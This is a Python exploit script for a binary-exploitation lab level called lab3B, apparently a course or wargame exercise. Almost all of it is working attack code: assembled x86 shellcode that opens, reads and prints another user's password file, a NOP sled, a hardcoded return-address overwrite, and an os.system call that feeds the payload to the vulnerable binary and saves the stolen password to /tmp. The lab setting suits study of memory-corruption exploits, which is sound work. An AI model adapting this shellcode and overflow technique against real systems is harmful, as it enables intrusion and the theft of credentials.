#!/usr/bin/python
# coding: utf-8


'''
Exploit for level lab3B
'''


import os
import pwn
import struct


#   Observations: This level prevents us from using execve syscall, so no
# shell can be obtained with our shellcode.

#   Exploitation: The goal of this level is to elaborate shellcode that
# can read from "/home/lab3A/.pass". We have to place it in the buffer,
# overwrite eip and jump to it.

# Here, our shellcode
instructions = [
    # First, open the file
    'xor ecx, ecx',
    'mul ecx',
    'push 0x73',        # s
    'push 0x7361702e',  # .pas
    'push 0x2f413362',  # b3A/
    'push 0x616c2f65',  # e/la
    'push 0x6d6f682f',  # /hom
    'mov ebx, esp',
    'mov al, SYS_open',  # SYS_open = 5
    'int 0x80',

    # Then, read
    'xchg eax, ebx',
    'xchg eax, ecx',
    'mov dl, 0xff',      # We are assuming password < 255 bytes
    'mov al, SYS_read',  # SYS_read = 3
    'int 0x80',

    # Finally, write to stdout
    'xchg eax, edx',
    'mov bl, 0x1',
    'mov al, SYS_write',
    'int 0x80',

    # Exit
    'xchg eax, ebx',
    'int 0x80'
    ]

loop = '\xeb\xbf'
shell = ''.join(map(pwn.asm, instructions))

# We have to be careful if we want to write the shellcode before the return
# address, this is because as we are pushing values into the stack, we can
# overwrite our own shellcode which will also be in the stack (overflow
# inside an overflow??)

# stack size - buf offset + old ebp - pushed bytes ("e/lab3A/.pass\0\0\0")
sz = 0xb8 - 0x20 + 4 - 0x10

# Note that we discarded "/hom" from the pushed bytes since it will overwrite
# the return address, not our shellcode

# For the return address we will use the address of the buffer. We can look
# at it with gdb and hopefully our huge NOP sled will balance the address
# shifting
retaddr = struct.pack('<I', 0xbffff550)

nop = '\x90' * (sz - len(shell))
buf = nop + shell + 'A' * 0x10 + retaddr  # The 'A' padding will be overwriten

# Ready to exploit!
cmd = 'python -c \'print "%s"\'' % buf
os.system('%s | /levels/lab03/lab3B | tail -n2 | head -n1 > /tmp/lab3A.pass' % cmd)
print '[+] Password saved in /tmp/lab3A.pass'
